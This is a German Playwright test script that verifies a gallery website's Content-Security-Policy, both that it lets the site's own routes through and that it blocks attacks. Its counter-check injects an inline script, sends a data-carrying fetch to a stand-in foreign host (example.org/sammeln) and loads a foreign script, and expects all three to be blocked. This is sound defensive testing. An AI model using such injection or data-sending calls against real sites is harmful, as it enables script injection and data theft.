// Schutzregeln (Content-Security-Policy als Meta-Angabe in index.html) —
// zwei Fragen, beide am laufenden Browser beantwortet:
//   1. Läuft der ganze Besuch, ohne dass die Regel etwas sperrt? Auch die
//      Wege, die nur auf der veröffentlichten Seite vorkommen (Live-Katalog
//      und Werkfotos aus dem Repo, Reservierung über den Formulardienst).
//   2. Sperrt die Regel wirklich? Ein eingeschleustes Skript und ein Abruf
//      an einen fremden Server müssen abgewiesen werden — sonst wäre Punkt 1
//      auch ohne jede Regel grün.
// Fremde Server werden dabei nie erreicht: jede Anfrage dorthin beantwortet
// der Test selbst. Eine Sperre der Regel greift vorher und zählt trotzdem.
// Aufruf: node test/schutzregeln.mjs [url]
import { chromium } from "playwright";

const URL_BASIS = process.argv[2] || "http://localhost:5173/";
const REPO_RAW = "https://raw.githubusercontent.com/sundsoffice-tech/galerie-jp-showroom/master/";
const PIXEL = Buffer.from(
  "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==",
  "base64"
);

const browser = await chromium.launch({
  args: ["--use-gl=angle", "--use-angle=swiftshader", "--enable-unsafe-swiftshader"],
});
const seite = await browser.newPage({ viewport: { width: 1280, height: 800 } });
const fehler = [];
seite.on("pageerror", (e) => fehler.push(e.message));

// Jede Sperre der Regel mitschreiben — vom ersten Byte des Dokuments an
await seite.addInitScript(() => {
  window.__sperren = [];
  document.addEventListener("securitypolicyviolation", (e) => {
    window.__sperren.push(`${e.effectiveDirective} → ${e.blockedURI || "inline"}`);
  });
});
const sperren = () => seite.evaluate(() => window.__sperren.slice());

// Fremde Server nie wirklich ansprechen
const eigen = new URL(URL_BASIS).host;
await seite.route(
  (u) => u.host !== eigen && u.protocol.startsWith("http"),
  (route) => {
    const adresse = route.request().url();
    if (/\.(png|jpe?g|webp)(\?|$)/.test(adresse)) {
      return route.fulfill({ status: 200, contentType: "image/png", body: PIXEL });
    }
    return route.fulfill({
      status: 200,
      contentType: "application/json",
      headers: { "access-control-allow-origin": "*" },
      body: JSON.stringify({ success: true }),
    });
  }
);

const schritte = [];
const pruefe = async (name, fn) => {
  try {
    const r = await fn();
    schritte.push(`  OK    ${name}${r ? " — " + r : ""}`);
  } catch (e) {
    schritte.push(`  FEHLT ${name} — ${e.message.split("\n")[0]}`);
  }
};

await seite.goto(URL_BASIS, { waitUntil: "load", timeout: 60000 });

await pruefe("Regel steht im Dokument", async () => {
  const regel = await seite.evaluate(
    () => document.querySelector('meta[http-equiv="Content-Security-Policy"]')?.content || ""
  );
  if (!regel) throw new Error("keine Meta-Angabe gefunden");
  for (const teil of ["default-src 'self'", "script-src 'self'", "object-src 'none'", "base-uri 'self'"]) {
    if (!regel.includes(teil)) throw new Error(`„${teil}“ fehlt`);
  }
  if (/script-src[^;]*'unsafe-(inline|eval)'/.test(regel)) throw new Error("Skriptregel ist aufgeweicht");
  if (regel.includes("frame-ancestors")) throw new Error("frame-ancestors wirkt als Meta-Angabe nicht");
  return `${regel.split(";").length} Angaben`;
});

await pruefe("Ganzer Besuch ohne eine einzige Sperre", async () => {
  await seite.waitForTimeout(2500);
  await seite.click("#enter");
  await seite.waitForTimeout(4200);
  await seite.click("#catalog-open");
  await seite.waitForTimeout(900);
  await seite.locator(".catalog-item").nth(1).click();
  await seite.waitForTimeout(2600);
  await seite.click("#aw-add");
  await seite.waitForTimeout(600);
  await seite.keyboard.press("Escape");
  await seite.waitForTimeout(500);
  await seite.click("#cart-open");
  await seite.waitForTimeout(800);
  await seite.keyboard.press("Escape");
  await seite.waitForTimeout(500);
  for (const art of ["impressum", "datenschutz", "kontakt"]) {
    await seite.evaluate((a) => document.querySelector(`[data-legal="${a}"]`).click(), art);
    await seite.waitForTimeout(400);
    const text = await seite.evaluate(() => document.getElementById("legal-text").textContent);
    if (text.length < 40) throw new Error(`${art} öffnet sich leer`);
    await seite.keyboard.press("Escape");
    await seite.waitForTimeout(300);
  }
  const s = await sperren();
  if (s.length) throw new Error(`${s.length} Sperre(n): ${s.slice(0, 3).join(" | ")}`);
  const modus = await seite.evaluate(() => window.__galerie?.modus);
  return `Betriebsart ${modus}, Impressum, Datenschutz und Kontakt geöffnet`;
});

await pruefe("Wege der veröffentlichten Seite sind erlaubt (Katalog, Werkfoto, Reservierung)", async () => {
  const r = await seite.evaluate(async (raw) => {
    const aus = {};
    aus.katalog = await fetch(`${raw}src/data/werke.json?t=1`, { cache: "no-store" })
      .then((a) => a.ok)
      .catch((e) => String(e));
    aus.foto = await new Promise((fertig) => {
      const bild = new Image();
      bild.crossOrigin = "anonymous";
      bild.onload = () => fertig(true);
      bild.onerror = () => fertig("Bild nicht geladen");
      bild.src = `${raw}public/werke/probe.png`;
    });
    aus.formular = await fetch("https://api.web3forms.com/submit", {
      method: "POST",
      headers: { "Content-Type": "application/json", Accept: "application/json" },
      body: JSON.stringify({ probe: true }),
    })
      .then((a) => a.ok)
      .catch((e) => String(e));
    aus.platzhalter = await new Promise((fertig) => {
      const c = document.createElement("canvas");
      c.width = c.height = 2;
      const bild = new Image();
      bild.onload = () => fertig(true);
      bild.onerror = () => fertig("data:-Bild nicht geladen");
      bild.src = c.toDataURL("image/jpeg", 0.7);
    });
    return aus;
  }, REPO_RAW);
  const rot = Object.entries(r).filter(([, wert]) => wert !== true);
  if (rot.length) throw new Error(rot.map(([k, w]) => `${k}: ${w}`).join("; "));
  const s = await sperren();
  if (s.length) throw new Error(`${s.length} Sperre(n): ${s.slice(0, 3).join(" | ")}`);
  return "Katalog, Werkfoto, Platzhalterbild und Formulardienst ohne Sperre";
});

await pruefe("Gegenprobe: eingeschleustes Skript und fremder Server werden gesperrt", async () => {
  const r = await seite.evaluate(async () => {
    window.__eingeschleust = false;
    const s = document.createElement("script");
    s.textContent = "window.__eingeschleust = true";
    document.body.appendChild(s);
    const fremd = await fetch("https://example.org/sammeln?daten=1")
      .then(() => "durchgelassen")
      .catch(() => "gesperrt");
    const skriptFremd = await new Promise((fertig) => {
      const t = document.createElement("script");
      t.src = "https://example.org/fremd.js";
      t.onload = () => fertig("durchgelassen");
      t.onerror = () => fertig("gesperrt");
      document.body.appendChild(t);
    });
    await new Promise((f) => setTimeout(f, 300));
    return { inline: window.__eingeschleust, fremd, skriptFremd, sperren: window.__sperren.slice() };
  });
  if (r.inline) throw new Error("Inline-Skript wurde ausgeführt");
  if (r.fremd !== "gesperrt") throw new Error("Abruf an fremden Server ging durch");
  if (r.skriptFremd !== "gesperrt") throw new Error("Skript von fremdem Server wurde geladen");
  if (r.sperren.length < 3) throw new Error(`nur ${r.sperren.length} Sperren gemeldet`);
  return r.sperren.join(" | ");
});

await browser.close();

console.log(`=== SCHUTZREGELN — ${URL_BASIS} ===`);
schritte.forEach((s) => console.log(s));
if (fehler.length) {
  console.log("SEITENFEHLER:");
  fehler.forEach((f) => console.log("  " + f));
}
const ok = schritte.every((s) => s.includes(" OK ")) && fehler.length === 0;
console.log(ok ? "ERGEBNIS: bestanden" : "ERGEBNIS: nicht bestanden");
process.exit(ok ? 0 : 1);
